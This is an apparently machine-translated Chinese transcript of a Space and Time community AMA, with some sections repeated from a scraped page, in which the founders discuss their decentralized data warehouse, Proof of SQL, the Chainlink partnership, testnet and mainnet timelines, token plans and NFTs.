的预言机向前推进时，我们总是会讨论如何从智能合约查询数据仓库。这样做的能力与 Chainlink 预言机有关，对吧？我们总是谈论我们需要如何能够获取数据仓库中的数据并将其写回智能合约。做到这一点的能力，能够将其放回智能合约的促成因素，是与 Chainlink 围绕其预言机合作的要求和需要。因此，如果您从数据仓库的角度查看从Space and Time查询的内容之间的数据流，以及作为正在运行的分析，什么被放回链上，Chainlink 处于其中的中心。所以很明显，我非常看好 Chainlink。我认为他们作为一个团队正在建设的东西总是具有前瞻性思维，很高兴有一个专注于让我们走得更快并使我们的技术进一步扩展的合作伙伴，因此，我们非常高兴能与他们合作。</p>\n<p><strong>Space and Time 目前在未来可能的代币发行方面的立场如何？假设的Space and Time代币模型会是什么样子？</strong></p>\n<p>Nate：我们经常收到这个问题，所以我想直截了当。我们目前没有推出代币的计划。话虽这么说，我们相信代币是一种很棒的机制，例如，对于节点操作。你听到我谈到了Space and Time 的隐私和数据隐私。让人们围绕节点操作悬赏以成为优秀的演员是围绕项目代币经济学的一个非常好的用例，这是一种新经济。如果你和Spencer、我自己坐在一张桌子旁，我想我们看到了一个世界，我们想要一个世界，在这个世界中，我们将在明年秋天进入生产状态，并在我们推出节点运营商时，它在这一点上启动令牌是有意义的。这是我个人喜欢做的事情，也是我知道其他联合创始人喜欢做的事情。</p>\n<p>我们已经在研究各种类型的代币经济学和模型。如果市场允许我们，如果我们能够，我们正在考虑。您可以围绕社区做很多很酷的事情，对吗？假设你创建了一个新的数据模型，你创建了一个数据管道，你创建了一种新型的分析报告，你想与人们分享它，人们开始使用它，人们开始参与你构建的东西，它是对整个社区来说是一项净正资产。作为一个使用代币模型的社区，您可以做一些非常了不起的事情来增加 Space and Time 的分析和工具的整体使用和管道。所以这是一个很长的答案。目前没有推出代币的计划。这并不是说我们没有在做这件事，也不是说我们不想推出代币。我认为从某种意义上说，代币发布的最佳时机是在明年年底主网发布时。但要做到这一点，必须有很多事情到位。</p>\n<p><strong>迄今为止最大的发展挑战是什么？</strong></p>\n<p>Nate：我认为大多数人会假设 SQL 证明。如果您考虑围绕 SQL Proof of SQL 的创新，我再次非常看好 SQL Proof of SQL。我认为这将改变我们将数据传输到链上和链下智能合约的方式。但对公司来说，更大的工程挑战可能是混合事务和分析数据库，即 Space and Time 的实际数据库，很多人忽视了我们从技术角度构建的内容。在今天的 Web2 中，你有数据仓库，就像你有 Databricks，你有 Teradata，你有 Snowflake，所以你有运行大规模分析的数据仓库。所以如果你想问非常复杂的问题，你有一个数据仓库来回答这个问题。例如，“得克萨斯州有多少 18 到 22 岁的人喜欢某种类型的音乐？”这样的问题。这是一个与快速交易问题截然不同的问题，例如，“Nate 今天买了什么？”</p>\n<p>事务性问题在数据库中提出，分析性问题在数据仓库中提出。然后如果你想把这些数据集放在一起，你实际上需要 ETL 工具，这意味着你从数据库中提取-转换-加载到数据仓库中，这样你就可以开始提出更复杂的问题。因此，一家 Web2 公司将拥有多个数据仓库、多个数据库和 ETL 工具来将所有这些整合在一起，Space and Time 在同一环境中进行交易和分析。那个混合事务和分析处理系统非常复杂，因为 Web2 今天从来没有解决过那个解决方案。在 Web2 中，您要购买多个数据库和工具。所以我认为更大的技术壮举实际上是在单一环境中结合了交易和分析处理。它有效。我们正在构建它，我们将要发布它。我们真的很兴奋，因为 Scott 和我花了 10 年时间围绕 Web2 破碎的数据架构，这些架构将多个数据库拼凑在一起，试图将这两个过程合二为一，所以这可能是我们正在完成的一项更具挑战性的技术壮举。</p>\n<p><strong>是什么让 Space and Time 成为一个能够成功的独特项目？</strong></p>\n<p>Nate：我喜欢这个问题，Spencer，你想回复吗？</p>\n<p>Spencer：简短的回答是，我真的认为我们的团队在这里要承担很多责任。我的意思是，我们现在拥有业内最勤奋、最有才华的团队之一。显然，我们正在通过为智能合约提供防篡改分析来连接链上和链下数据，从而在该领域做一些创新，这是我们的主要工作。但是我们拥有最勤奋的团队之一，一些这个领域最有才华的密码学家，一些这个领域最有才华的数据库工程师，我们正在为这个项目夜以继日地工作，这里的每个人都非常热情我们有一个了不起的社区，你们，这让我们曝光了。我认为你们是我们这一整年努力的证明，从会议到后端编码的一切。所以不确定我是否在那里从技术上回答了 T，但也许我会把它传递给你，让你快速总结一下这个问题，Nate。</p>\n<p>Nate：当然，我不同意。我认为我们的团队是非凡的。你看看数据库、密码学、数据仓库方面的专家，我们有非常好的营销，我们也有一个非常好的进入市场的团队。该团队专注于交付项目，并且全天候工作。我要补充的另一件事是，我认为从商业角度来看，Web3 将会获胜。如果你正在构建一个新的应用程序，我坚信你将在 Web3 中构建新的应用程序作为一项业务。而且我认为 Web3 社区将继续高速增长，新的应用程序将主导市场。那是我的信念。这就是我们构建 Web3 原生内容的原因。因为我们可以接管所有 Web2 业务，并进行艰苦的工作，将其推倒重来，并将其转移到 Web3 结构中。但我认为在一段时间内，你会看到想要建立业务的人，想要参与不同项目的人，将想要参与 Web3 构建。经济学是不同的，经济学关注的是社区，我认为在一段时间内，Web3 业务结构将被证明是赢家。当我们交付我们正在构建的东西并在 Web3 结构中交付以供采用时，我认为这会创造出真正全面发展市场的能力的浪潮。因此，我们对这个机会感到非常兴奋，因为正在建立的市场实际上是为世界建立的下一代业务，我们将坐在其中。</p>\n<p>如果团队不专注于交付，它就不会发生。这将成为使我们能够成功的惯性和起源。但如果你说不出来，我非常、非常看好这个社区，因为我们都在这里，因为我们认为有更好的方式来相互交流。我们认为我们的数据有更好的使用方式。我们认为，有一种更好的方式来构建业务来为多数人而不是少数人提供动力。因此，我认为 Web3 的整体商业原则将在未来几年和几十年内继续加速并继续在市场上取胜。</p>\n<p><strong>总结</strong></p>\n<p>Spencer：太好了，伙计们，我想今天的 AMA 就到此为止了。大家，随时联系我们吧！我们希望在这里沟通零障碍，我们希望你们能与我们交谈。请在 Discord 上联系 Mike 和我本人。Mike在沟通和确保听到您所有的声音方面非常出色。我们想让 Discord AMA 变得更加常规。我们最近经常出差，所以很辛苦，但我们肯定会让这些变得更规律。我只想再次感谢大家的支持，我怎么强调我们还早呢。我们在这里制作还不到一整年，我们对未来有很多期待。所以我会用它来结束它。Mike，非常感谢你穿上它，感谢你组织一切。好的，伙计们，我们会在下一个节目中找到你。</p>\n<p>Nate：谢谢大家！</p>\n<p><code>[会议结束]</code></p>\n<p><strong>Space

创意总监\n感谢所有出席的社区成员！\n[会议开始]\n介绍\nSpencer：我们很高兴你们都在这里，我们的社区在 SmartCon 之后绝对爆炸式增长。我的名字是Spencer Reeves，我是 Space and Time 的创意总监。我很高兴在这里与你们中的许多人互动，欢迎所有新面孔！我将把话筒交给 Nate。\nNate：谢谢，Spencer，我对这次 AMA 感到非常兴奋，我整个星期都在期待它。正如Spencer 所说，我们对社区感到非常兴奋。我们很高兴你在这里，我们很高兴我们正在共同建设它。我们正在努力做很多令人兴奋的事情，我们希望在我们继续前进的过程中开始让社区参与进来。我想你会从我们这里看到我们在 Discord 上的参与度也越来越高。我叫 Nate Holiday，是 Space and Time 的首席执行官兼联合创始人，我真的很期待在接下来的一个小时里回答问题，并确保您对项目和我们正在构建的内容有尽可能多的访问权限和洞察力作为一家公司以及公司的员工和创始人，在我们继续构建它的过程中，我们希望与您进行非常公开和透明的接触。\nAMA\nSpace and Time项目是如何产生的？有什么故事？主要团队是如何组建的？\nNate：Space and Time 是一个为 Web3 原生构建的去中心化数据仓库。而Spencer和我，我们在数据仓库方面拥有丰富的经验。如果您考虑数据库和数据仓库，我们都在 Teradata 作为高管工作了很长时间。 Teradata 已经建立了业内领先、最重要的数据仓库之一。它已经存在了 40 年，并且还进行了整个云转型。 Teradata 开始将他们的数据仓库移植到云端，您开始看到其他类型的云提供商围绕 Snowflake 和 Databricks 以及各种类型的云提供商兴起。\nWeb2 数据库和数据仓库的问题是，第一，它们非常集中。如果你考虑云服务，你甚至会放大数据库和数据仓库的集中化，因为一切都在转移到少数主要云提供商。其中一部分真的很好：如果你想建立新业务，有很多云服务可以让建立新业务变得非常容易，并且可以尽早开始。但是世界上的中心化数据库也存在很多问题。随着世界走向去中心化，随着世界从不同业务之间的无边界整合转变，我们坚信数据库和数据仓库的去中心化是新的前沿，是下一个前沿。\n我进入 Web3 是通过 Chainlink，作为 Chainlink 的战略顾问，我开始与团队围绕上市、数据战略和战略计划展开合作。对我来说变得非常明显的一件事是，正在构建的去中心化应用程序都是构建在我们帮助创建的 Web2 结构上的：这些集中式数据库，这些大型云服务提供商。少数人控制着多数人的大量数据。如果你正在构建去中心化的应用程序，我们应该有去中心化的数据库和数据仓库来支持它，将隐私带回互联网成员，确保你对你的数据有完全的控制权，同时也确保当你考虑正在构建的应用程序，它们可以被信任和验证。\n你看看当今世界上正在构建的 DeFi 应用程序，我想我们所有人都知道，在一周又一周的新闻中，你继续听到关于黑客的信息，你继续听到人们得到他们不应该得到的信息可以访问，有正在发生的内部工作。因此，这些集中式数据库存在一个已知问题。如果你正在构建一个去中心化的应用程序，你需要确保它是安全的，你需要确保它广泛分布，你需要确保你提供给最终用户、应用程序的实际数据， DeFi 项目，实际用户可以信任它。因此，我们看到了一个巨大的机会，我们可以致力于构建下一代数据库，下一代软件。\n如果你只是从数据库转换的角度考虑，你可以把它放在一张非常简单的幻灯片中，说二十年前它是内部部署数据库和数据仓库，你有世界上的 Oracles 和世界上的 Teradatas。现在你有，目前正在建设中，云数据库，你有各种类型的云服务器和数据库，为当今世界提供动力。而在未来，我们正在建设未来，下一代数据库技术和数据仓库，它是去中心化的。因此，我们真的很高兴能为这一旅程提供动力并进行建设。\n对于技术水平不高的人，您能否用更简单的术语解释Space and Time？\nNate：是的，这是一个很好的问题，我们一直都在问这个问题。对于世界上的大多数人来说，甚至数据仓库的概念也是一个复杂的概念。我的想法是数据仓库允许将表大规模连接在一起以进行分析和建模并为业务流程提供动力。所以简单来说，数据库和数据仓库，我用不同的术语来使用它们，因为它们在行业中做不同的事情。但总的来说，对于不了解数据库和数据仓库的人来说，如果你去 ebay.com 或者你去你最喜欢的购物网站，他们会运行不同类型的推荐引擎来确定你可能喜欢什么，什么你可能喜欢看，你可能喜欢买什么。这些推荐引擎使用关于你和你这样的人的数据以及相似的模型来根据你在网络中的交互方式来确定他们应该向你展示什么。\n数据仓库还用于为企业提供动力，仅从账簿结账的角度来看，如果你今天想去经营一家企业，假设你是一家上市公司，你希望能够每周、每个月、肯定每个月都结账如果你是公开交易的，但即使是每一天，也需要数据库和数据仓库的力量才能确定当天、那一周、那个月、那个季度的成本和收入，以便能够确定您的业务所在的位置。显然，您对收入和成本的洞察力越多，您在建立业务时就越容易做出改变，以确保在结束一个月、结束一个季度时，您对结果有更多的控制权，这将给市场和投资者带来更大的信心。\n因此，这些只是我们考虑用例时的两个示例，我喜欢的另一个是游戏。如果您曾经下载过游戏并经历了这个入职流程，这个流程简单吗？那个过程很难吗？在这个过程中，有人会因为你要求的信息过于机密、他们不想给你，或者你有太多的步骤要经过而退出吗？例如，帮助一家游戏公司确定您何时吸引客户，这是什么样的？拥有该应用程序的数据能力是一个非常好的用例，以确保您可以与客户互动并以减少该游戏中入职摩擦的方式入职。然后也只是玩电子游戏。如果你想一想谁在你的社交网络中，你是如何与他们互动的，所有这些都是通过后端的数据库和数据仓库运行的，以通过技术设备和通过互联网。因此，我们正在为此提供动力，以便在您通过各种技术相互交流时减少世界上的摩擦。\n我们听到很多关于 SQL Proof of SQL 的信息，你能详细解释一下它，它在《Space and Time》中扮演什么角色，以及为什么它如此新颖吗？\nNate：当然，SQL 证明是有远见的，它将改变市场，我们非常看好 SQL 证明。这就是为什么。如果您考虑一下我刚才谈到的所有业务流程，这些流程今天都在集中式数据库上运行，并由集中式数据仓库提供支持。今天，全世界都相信拥有服务器的人、拥有软件和数据库的人以及在这些服务器、软件和数据库上运行的实际公司不会造成伤害。我们只是相信这是一个公平和诚实的系统，而实际上，公司每天都在优化他们参与的方式，以有利于他们的用户参与，增加收入，降低成本。这很公平；他们有能力在一段时间内使用数据改善业务。\n但是，如果您考虑去中心化应用程序，现在您突然需要确保您可以信任您的资金流向。您知道，您与该应用程序交互的方式是否公平？如果你正在玩电子游戏，如果你正在使用 DeFi 协议，那么这些牌是否对你不利？因此，我们正在构建的真正令人兴奋的是，在未来一年、两年、三年、四年、五年、十年、二十年内，每个人都认为今天公平的集中式流程将转向智能合约，令人兴奋的部分是这些智能合约将会自动化，这样就没有人的参与和互动。令人兴奋的是，通过 SQL Proof of SQL，我们可以使向智能合约交付的数据可验证和防篡改，以便您作为用户可以信任它。所以你可以说，在运行时，是否有任何东西篡改了数据？有没有添加数据？是否删除了任何数据？他们是否改变了以前运行查询的方式，这样输出可能会有所不同，或者卡片的堆叠方式会有所不同？\n因此，围绕 Proof of SQL 的令人兴奋的部分是，智能合约现在可以查询整个数据仓库，而且从该数据仓库查询的内容比今天可以查询的内容大很多倍。所以这意味着防篡改分析的用例增长，对吧？因为对于您可以在数据仓库中执行的任何操作，现在您可以将防篡改、可验证、无需信任的结果交付给智能合约。所以现在您可以开始采用该业务逻辑或自动化，并且可以将其转移到可以信任的智能合约中。\n令人兴奋的是，它改变了权力动态。它说，如果你想参与 Web3 应用程序的新世界，你应该使用 SQL 证明，因为它向智能合约证明你所做的事情是公平和诚实的。而且它也向智能合约证明某些东西没有被篡改过。如果您考虑一下，用户会喜欢它，因为它是透明的，它是防篡改的。企业喜欢它还因为，想想看，它是公平和透明的。如果我今天是一个 DeFi 协议的首席执行官，该协议在链上为数亿美元或数十亿美元提供支持，并且我在集中式数据库中运行所有这些协议，我晚上将无法入睡。因为作为一家公司的首席执行官，我也希望有信心，如果我为数亿美元提供动力，我不会在第二天醒来时看到内部黑客或外部黑客，结果现在我必须决定如何最好地满足我们客户的需求，因为一亿美元被盗了。\n因此，在我们前进的过程中，双方都会喜欢能够为智能合约提供支持的防篡改分析的能力。\n您是在构建一个仅用于其他 Web3 项目的产品，还是用于替换现有的 Web2 数据存储和处理解决方案？如果是后者，什么会吸引大公司在他们今天使用的解决方案上转向 Space and Time？\nNate：另一个很好的问题，Web3 的应用程序世界非常庞大，并且正在以非常快的速度增长。 Space and Time 是一个原生的 Web3 去中心化数据仓库，它将推动行业向前发展。我们正在为此建造它。因此，我们认为要吸引我们的 alpha 客户、beta 客户并最终通过生产发布，我们的重点是我们正在构建应用程序时赋予 Web3 世界权力。话虽这么说，在接下来的几年里，你将开始看到 Web3 和 Web2 的界限融合在一起。已经有 Web2 公司，顺便说一下，非常大的公司，他们打电话给我们说，“嘿，我们知道我们需要开始与区块链数据交互，但我们不确定如何去做，因为我们拥有所有这些集中的 Web2 数据库。我们拥有所有这些数据库和数据仓库专家的工程师，我们对他们都进行了 SQL 培训，但我们真的不知道如何考虑从不同的区块链中获取所有这些区块链数据 ”\n因为他们看到了一个正在生成区块链数据的世界，并且将会有多个区块链，他们将不得不与之交互。他们正在看着它，说：“我们将把所有这些数据从链下转移到我们的企业数据架构中，但我们不确定它适合哪里 ” 他们喜欢关于 Space and Time 的令人兴奋的部分是，他们将其视为入口，我们为数据编制索引，我们将其放入关系数据存储中，我们使其可供他们使用，它在数据仓库结构中他们知道并理解，现在它正在驱动 SQL 语言。因此，现在他们可以开始将他们的 ERP 系统、云端或本地的遗留数据仓库桥接在一起，并且他们可以开始在单一环境中将他们的数据架构桥接在一起。\n如果你想一想，从企业到企业的结构和 Web2 中真正强大的另一件事是这个概念，例如，假设Mike，Spencer和我都去听音乐会，我们坐在那里，我们喜欢这场音乐会，我们玩得很开心。如果您考虑为该音乐会提供支持的企业，那么有数十或数百家企业为该音乐会提供支持。有停车场，有食物，有衬衫，还有售票。坐在那里的所有这些人都在为我们提供服务，但实际上我们只是买票，食物被送到我们的座位上，或者我们去拿食物，然后我们就参加了这场音乐会。嗯，那场演唱会的后台系统今天很复杂。那场音乐会的结算在今天非常复杂。他们必须了解该用户做了什么、他们买了什么以及他们如何参加音乐会，他们必须决定如何将所有收入分配给参与的所有不同企业。\n而今天，这个过程需要数周或数月才能确定如何将其全部拆分。你想一想是什么推动了下一代消费者如何与一家企业互动，而这反过来又需要向许多不同的企业付款，Space and Time 正在构建的区块链用例和数据仓库用例正好位于其中。这非常强大，因为大多数企业都以这种方式运营，所以现在你开始整体地桥接 Web2 和 Web3。\n封闭的 alpha 即将到来，人们如何参与？\nNate：我们的目标是在年底推出我们的封闭式 alpha。我们确实希望参与我们封闭的 alpha 测试。如果您有兴趣参与并且有一个需要数据的项目并且您希望能够与该数据进行交互，请联系 Mike、联系 Spencer、联系我们的团队。它关闭是因为我们想确保我们在 Web3 中测试的 DeFi 和游戏中有正确的用例，我们想确保您拥有正确的资源和支持，我们想确保您从 alpha 角度来看，拥有您需要的一切。但它有点侧重于业务用例。因此，如果您正在从事一个项目，并且想尝试一下我们正在启动的 alpha 项目，请联系我们，我们很乐意与您合作。\n让我们换个话题，Spence，我们最近发布了我们的第一个Space and Time NFT，关于未来的版本，您能告诉我们什么？\nSpencer：首先，我只想对大家表示感谢，感谢大家对我们从第一次 Space and Time NFT drop 中得到的惊人回应，我知道这有点像游击营销策略，我们只是突​​然发布了它。这首先是我们的想法，我们只是想让它变得公平，让每个人都有平等的机会获得一个。 Omar Aqil 是艺术家，我看到你们中的一些人在 Twitter 上给予他爱，我非常感谢。他实际上向我伸出了手，并且对你们给予他的支持以及他收到的所有赞美感到不知所措，所以我只想表达他对社区的感谢。\n就Space and Time 社区NFT的未来计划而言，我们总共收集了五个。我们已经发布了一个，我们还计划在未公开的未来日期再发布四个，我们现在正在调整智能合约的一些功能。一旦我们完成这些，我们就会为你们向社区推出更多 NFT。我们很高兴你们所有人这么早就来了，这就是我们发起这种倡议的目的，真正奖励你们来到这里，在我们的社区中如此活跃。每个在 Twitter 上大喊大叫的人，都不会被忽视！我们审视了所有这些，我们非常感谢绝对的支持，我们很高兴在未来发布更多。就为这些社区 NFT 添加一些实用性而言，目前它们没有实用性。就像我们说的，它们只是供你们佩戴，作为作为该项目早期支持者的荣誉徽章，但我们绝对期待未来也能为 NFT 添加一些Space and Time实用程序。\n测试网的计划是什么？任何人都可以参加吗？是否有任何激励参与的计划？\nNate：我们计划明年 5 月推出测试网，它将是开放的。关于我们正在构建的令人兴奋的事情是，我们正在创建Space and Time以从主要区块链中获得干净的索引数据，这意味着如果您在测试网期间访问我们的网站并运行查询，您实际上将拥有区块链数据在主要链条上编入索引，准备就绪。所以即使你没有经营企业，即使你没有坐在那里说，“嘿，我没有要连接的 ERP 系统，我不是在制作视频游戏，所以我无法连接Unreal Engine 5，我不需要在大规模环境中合并我的链上和链下数据，”你仍然可以转到 Space and Time 并开始查看区块链数据并运行分析以独立获得更多洞察力将链下数据汇集在一起​​。这是一件非常强大的事情，因为现在你可以开始研究，例如，你遇到的简单问题，比如跨链某些代币的主要持有者，或者查看跨链流动资金池的能力。因此，您可以开始做一些非常强大的事情，因为来自主要链的区块链数据将被编入索引，以便您开始运行查询。\n这将是开放的，您可以开始尝试并参与测试网和测试版。因此，我们看到的令人兴奋的事情是我们希望让您随时可以使用这些数据。我们想让它易于使用。因此，我们将为您存储区块链数据。这不像您必须创建一个新实例来存储数据并为存储的数据付费。我们希望为您提供随时可用的索引数据。因此，当您登录到 Space and Time 并希望仅对区块链数据运行查询时，即使您没有链下数据，它也很容易为您提供，您可以继续运行该数据并运行那些分析，您不必弄清楚如何为数据索引付费。它应该就在那里，随时可以使用。所以我们非常兴奋，我们绝对欢迎大家加入我们在 5 月份推出的测试版本和beta版本。\n当 Space and Time 进入主网时，是否任何人都可以操作节点，还是仅限于具有特殊权限的人？\nNate：我们希望尽可能多的人对运行节点感兴趣。如果您考虑一下，数据仓库就是节点集群。因此，当我们进入市场并构建节点运营商时，不同之处在于，如果您运行大规模分析，我们将在节点集群上运行它们。所以从集群的角度来看是三个或更多。所以这有点不同于“我有一台笔记本电脑在这里，它没有被使用，我只是想启动它”，但我们确实希望有尽可能多的人参与，也希望有尽可能多的企业参与节点操作可能的。我们正在与一些大型服务器和计算提供商合作，以考虑不同的选择，以及我们如何让可能无法访问服务器或节点集群的人也能参与节点操作。\n所以我们仍处于计划的早期阶段，但我坚信，如果你想参与公用事业，即使你没有大仓库或一堆服务器，你作为人们应该能够参与该生态系统和经济。如果您考虑出租房屋、AirBnB，例如，如果您考虑风骡或石油钻井平台，从某种意义上说，您希望能够参与可能拥有一部分石油钻井平台或实际资产的经济活动石油钻井平台，无需知道如何操作石油钻井平台，无需去钻实际的石油并将石油取出并出售给商品市场。所以我们以同样的方式考虑，因为显然操作服务器集群很复杂，所以我们正在考虑如何确保人们可以作为节点运营商或部分节点运营商参与 Space and Time，所以这是我们正在努力的事情。\n该项目未来的资金计划是什么？当前的资金跑道是否延伸到主网，或者是否会有未来的融资轮次？\nNate：我们非常荣幸并感谢投资者群体对我们的资助和支持。目前没有计划在我们的测试网之前筹集更多资金。当我们考虑进入主网时，我们有足够的资金来启动进入主网。因此，在我们准备主网上线时，我们会关注市场，以确定什么是最适合企业运营的。但值得庆幸的是，我们已经成功地得到了投资界的支持，对许多人来说，这是一个非常艰难的市场。我们已经能够发展我们的投资社区，并得到他们的支持。所以我们对此表示感谢。但简单的答案是，我们有足够的资金通过主网运行。我们没有计划在今年筹集更多的资金。我们主网上线的目标是在秋天，9月/10月。我们将看看市场情况，我们将看看我们想从主网上线和主网启动的角度实现什么，并确定什么是对公司最好的，但目前还没有计划。\n在上一届 AMA 会议上，有人问到 EVM 兼容网络的问题，Scott 回答说除了以太坊之外，还有支持 Solana 和 Flow 的计划。未来是否还有计划与 Aptos 和 Near 一起推出 SxT？\nNate：好问题；当您考虑在明年秋天全面投入主网时，我们看到这样一个世界，人们在其中运行应用程序和业务的主要区块链应该可以免费使用，并使用 Space and Time 中的关键数据存储索引。因此，这不是“如果”的问题，而是“何时”的问题。我们谈到了 Solana，我想你看的是 Mysten Labs 和 Sui，对吧？团队目前正在与他们合作为该数据编制索引。所以你看看 Near，你看看 Aptos，你看看 Flow。对我来说，这不是我们是否要这样做的问题，这只是通过数据索引工作并确保其可用最有意义的时间和优先级。但我们绝对希望将主要生态链编入索引，随时可供您作为商品运行查询，作为一种随时可以免费使用的东西。\nSpace and Time 参与了 Kwil 最近的一轮融资，看起来 Kwil 将成为 Space and Time 的直接竞争对手，Space and Time 投资该项目的原因是什么？\nNate：我们非常喜欢 Kwil 的团队，行业需要 Kwil 团队正在建设的东西。我只想先退后一步，考虑将行业数据用于 SQL 所需的不同用例。需要许多不同的用例来支持各种类型的业务和各种类型的分析。如果您考虑 Web2 中的 SQL 解决方案，它们非常庞大且各不相同。运行 Snowflake 数据仓库与 MySQL 有不同的原因。在数据库和数据仓库中操作的原因各不相同，我们不认为这是一个赢家通吃的市场。如果你考虑 Web3，我认为会有很多不同的很棒的、成功的项目，我们相信 Kwil 会成为其中之一。\n因此，当您考虑如何运行各种类型的分析以及这些分析的不同用例时，例如，您会对各种类型的简单 SQL 查询有不同的解决方案。它与 SQL 证明、大规模企业分析、所有主要链的索引有很大不同。所以我们看好 Kwil 的建筑，绝对，他们很棒。我们喜欢这个团队，我们认为在不同类型的用例中使用市场上各种类型的数据库有很多不同的原因。所以我们绝对不相信这是一个赢家通吃的市场，我们对他们在 Kwil 的建设感到兴奋。从某种意义上说，问题是如果您正在构建一个项目，为什么不对所有内容都使用Space and Time呢？虽然你可以，但在某些用例中它可能更有意义，例如，如果你在 Arweave 上，并且你需要运行快速分析，那么启动 Kwil 并在其中运行一些 SQL 分析可能更有意义Arweave 社区。因此，我们对他们正在构建的产品感到兴奋，我们相信许多人都有参与并赢得 SQL 市场的空间。 \nSpace and Time相比Web2存储商在数据存储安全方面有什么优势？ Space and Time 如何保护用户数据？\nNate：我不想太技术化，但是，如果您考虑去中心化网络，就会发现数据安全与中心化网络相比具有特定的优势。如果你将所有数据都放在一个中央数据库中，显然，从数据安全的角度来看，它会变得更容易被黑客攻击，更容易从整体上获取信息并从这个角度成为坏人。虽然 Space and Time 是一个开源项目并且我们希望它是这样，并且我们鼓励每个人共享数据并围绕数据相互交互，但我们也有端到端加密，这意味着如果您选择当您参与 Space and Time 时，您可以确定数据是否需要在静态和查询过程中加密。所以这提供了一个非常强大的数据安全能力，因为它总是被加密的。如果您选择加密——顺便说一下，它是可定制的——您可以确定要加密哪些表，然后该表在静态和动态中加密。我们还有一些非常独特的技术和合作伙伴关系，我们也正在使用这些技术和合作伙伴专门针对数据加密。\n然后，很明显，我认为通用的 Web3 响应考虑了我们拥有的各种类型的已知运营商以及围绕节点运营商的激励措施；确保节点运营商的数据和安全性以积极的方式参与是有价值的。我要指出的最后一部分是 SQL 证明。因此，Space and Time 的独特之处在于它具有数据的存储证明和 SQL 证明。因此，如果您在 Space and Time 中运行数据，如果您使用 SQL 证明来确保数据不被篡改，那么您将获得额外的安全级别。当数据进入时，您拥有额外级别的安全性以确保数据不被篡改并且存在存储证明。\nScott 和团队正在构建的索引平台令人兴奋的事情之一是，他们也在推动对进入Space and Time 的实际索引数据的防篡改洞察。因此，在许多不同的领域中，索引数据的防篡改具有一定程度的安全性：SQL 证明、数据加密、网络去中心化以及围绕参与者激励的节点操作。因此，从数据安全的角度来看，有许多不同的领域存在制衡，所有这些都是在这方面对 Web2 的改进。\nChainlink 是传统市场和加密世界领先的预言机提供商，Space and Time 与 Chainlink 合作，以提高链上和链下数据库的及时性和准确性。您能告诉我们更多有关 Space and Time 如何使用 Chainlink 网络的信息吗？\nNate：Chainlink 是一个了不起的合作伙伴。他们是我们从第一天开始就与他们一起构建的人，我们甚至在考虑构建去中心化数据仓库和构建这个数据生态系统的结构时就构建了前一天。我想说的第一件事是，我们对 Web3 如此兴奋和看好的原因之一是能够在 Web3 的新数据标准上进行协作。成为 Chainlink BUILD 计划的一部分对我们来说真的很令人兴奋，因为我们可以与他们正在构建的先驱一起参与 Web3 的真正前瞻性数据开放标准构建。我们不必去构建预言机结构，因为 Chainlink 是预言机去中心化的领导者。\n因此，令我们兴奋的是，我们可以参与并专注于数据库，专注于数据仓库，以与 Chainlink 正在构建的生态系统进行交互。因此，我们开始参与并扩展我们的数据用例，而不必在其他人比我们能力强得多的领域自己构建所有内容。但我会给你举个例子。因此，当您考虑我们将如何使用 Chainlink 的预言机向前推进时，我们总是会讨论如何从智能合约查询数据仓库。这样做的能力与 Chainlink 预言机有关，对吧？我们总是谈论我们需要如何能够获取数据仓库中的数据并将其写回智能合约。做到这一点的能力，能够将其放回智能合约的促成因素，是与 Chainlink 围绕其预言机合作的要求和需要。因此，如果您从数据仓库的角度查看从Space and Time查询的内容之间的数据流，以及作为正在运行的分析，什么被放回链上，Chainlink 处于其中的中心。所以很明显，我非常看好 Chainlink。我认为他们作为一个团队正在建设的东西总是具有前瞻性思维，很高兴有一个专注于让我们走得更快并使我们的技术进一步扩展的合作伙伴，因此，我们非常高兴能与他们合作。\nSpace and Time 目前在未来可能的代币发行方面的立场如何？假设的Space and Time代币模型会是什么样子？\nNate：我们经常收到这个问题，所以我想直截了当。我们目前没有推出代币的计划。话虽这么说，我们相信代币是一种很棒的机制，例如，对于节点操作。你听到我谈到了Space and Time 的隐私和数据隐私。让人们围绕节点操作悬赏以成为优秀的演员是围绕项目代币经济学的一个非常好的用例，这是一种新经济。如果你和Spencer、我自己坐在一张桌子旁，我想我们看到了一个世界，我们想要一个世界，在这个世界中，我们将在明年秋天进入生产状态，并在我们推出节点运营商时，它在这一点上启动令牌是有意义的。这是我个人喜欢做的事情，也是我知道其他联合创始人喜欢做的事情。\n我们已经在研究各种类型的代币经济学和模型。如果市场允许我们，如果我们能够，我们正在考虑。您可以围绕社区做很多很酷的事情，对吗？假设你创建了一个新的数据模型，你创建了一个数据管道，你创建了一种新型的分析报告，你想与人们分享它，人们开始使用它，人们开始参与你构建的东西，它是对整个社区来说是一项净正资产。作为一个使用代币模型的社区，您可以做一些非常了不起的事情来增加 Space and Time 的分析和工具的整体使用和管道。所以这是一个很长的答案。目前没有推出代币的计划。这并不是说我们没有在做这件事，也不是说我们不想推出代币。我认为从某种意义上说，代币发布的最佳时机是在明年年底主网发布时。但要做到这一点，必须有很多事情到位。\n迄今为止最大的发展挑战是什么？\nNate：我认为大多数人会假设 SQL 证明。如果您考虑围绕 SQL Proof of SQL 的创新，我再次非常看好 SQL Proof of SQL。我认为这将改变我们将数据传输到链上和链下智能合约的方式。但对公司来说，更大的工程挑战可能是混合事务和分析数据库，即 Space and Time 的实际数据库，很多人忽视了我们从技术角度构建的内容。在今天的 Web2 中，你有数据仓库，就像你有 Databricks，你有 Teradata，你有 Snowflake，所以你有运行大规模分析的数据仓库。所以如果你想问非常复杂的问题，你有一个数据仓库来回答这个问题。例如，“得克萨斯州有多少 18 到 22 岁的人喜欢某种类型的音乐？”这样的问题。这是一个与快速交易问题截然不同的问题，例如，“Nate 今天买了什么？”\n事务性问题在数据库中提出，分析性问题在数据仓库中提出。然后如果你想把这些数据集放在一起，你实际上需要 ETL 工具，这意味着你从数据库中提取-转换-加载到数据仓库中，这样你就可以开始提出更复杂的问题。因此，一家 Web2 公司将拥有多个数据仓库、多个数据库和 ETL 工具来将所有这些整合在一起，Space and Time 在同一环境中进行交易和分析。那个混合事务和分析处理系统非常复杂，因为 Web2 今天从来没有解决过那个解决方案。在 Web2 中，您要购买多个数据库和工具。所以我认为更大的技术壮举实际上是在单一环境中结合了交易和分析处理。它有效。我们正在构建它，我们将要发布它。我们真的很兴奋，因为 Scott 和我花了 10 年时间围绕 Web2 破碎的数据架构，这些架构将多个数据库拼凑在一起，试图将这两个过程合二为一，所以这可能是我们正在完成的一项更具挑战性的技术壮举。\n是什么让 Space and Time 